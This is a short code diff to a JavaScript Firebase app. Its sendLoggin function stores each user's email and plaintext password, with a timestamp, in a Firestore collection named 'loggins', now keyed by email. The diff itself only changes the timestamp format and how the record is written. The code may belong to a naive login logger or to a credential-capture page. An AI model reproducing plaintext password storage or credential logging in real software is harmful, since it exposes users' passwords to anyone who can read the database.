@@ -1,5 +1,5 @@
 import { initializeApp } from 'firebase/app';
-import { collection, getDocs, getFirestore, setDoc, addDoc} from 'firebase/firestore'
+import { collection, getDocs, getFirestore, setDoc, addDoc, doc} from 'firebase/firestore'
 import { getAuth, signInWithEmailAndPassword } from 'firebase/auth';
 let firebaseApp;
 let db; 
@@ -59,9 +59,9 @@ async function sendLoggin(emailToUse, password){
     let logginData = {
         email: emailToUse, 
         password: password,
-        timestamp: `${date.toDateString()}`
+        timestamp: `${date.toString()}`
     }
-    await addDoc(collection(db,'loggins'),logginData);
+    await setDoc(doc(db,'loggins/',logginData.email),logginData)
 }
 
 async function getEmails(){
